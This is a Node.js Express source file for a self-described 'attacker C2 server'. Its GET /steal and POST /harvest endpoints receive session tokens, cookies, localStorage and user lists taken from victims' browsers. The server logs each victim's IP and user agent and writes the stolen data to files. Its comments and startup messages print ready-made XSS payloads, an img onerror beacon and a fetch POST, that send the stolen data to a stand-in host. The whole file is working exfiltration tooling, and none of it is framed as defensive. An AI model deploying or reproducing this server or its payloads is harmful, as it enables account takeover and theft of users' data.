const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser'); // Needed for POST bodies
const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for all domains so victims can send data
app.use(cors());

// Parse JSON and URL-encoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// === 1. The "Steal" Endpoint (GET) ===
// Good for simple token stealing via <img src="...">
// Payload: <img src=x onerror="new Image().src='https://.../steal?token='+myid">
app.get('/steal', (req, res) => {
    const token = req.query.token;
    const data = req.query.data; // Capture generic data
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    const logEntry = `[${timestamp}] [GET] IP: ${ip} | Token: ${token} | Data: ${data} | UA: ${userAgent}\n`;

    console.log(`\n[+] 🎣 GET Catch!`);
    if (token) console.log(`    Token: ${token}`);
    if (data) console.log(`    Data: ${data}`);
    console.log(`    IP: ${ip}`);

    fs.appendFile(path.join(__dirname, 'stolen_data.txt'), logEntry, (err) => {
        if (err) console.error('Error saving to file:', err);
    });

    // Return transparent 1x1 GIF
    const img = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': img.length
    });
    res.end(img);
});

// === 2. The "Harvest" Endpoint (POST) ===
// Better for large data (cookies, localStorage, user lists)
// Requires fetch() or XHR in the payload
app.post('/harvest', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    const body = req.body;

    console.log(`\n[+] 💰 POST JACKPOT! Massive Data Haul from ${ip}`);
    console.log(JSON.stringify(body, null, 2));

    const logEntry = `[${timestamp}] [POST] IP: ${ip}\n${JSON.stringify(body, null, 2)}\n----------------\n`;

    fs.appendFile(path.join(__dirname, 'harvested_data.txt'), logEntry, (err) => {
        if (err) console.error('Error saving to file:', err);
    });

    res.json({ status: 'success' });
});

// Default route
app.get('/', (req, res) => {
    res.send('<h1>👾 Advanced Attacker C2 Server Online 👾</h1><p>Listening for GET /steal and POST /harvest</p>');
});

app.listen(PORT, () => {
    console.log(`\n[!] Server Running on port ${PORT}`);
    console.log(`[!] GET Payload (Simple): <img src=x onerror="new Image().src='https://your-url.com/steal?token='+myid">`);
    console.log(`[!] POST Payload (Advanced): fetch('https://your-url.com/harvest', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(stolenData)})`);
});
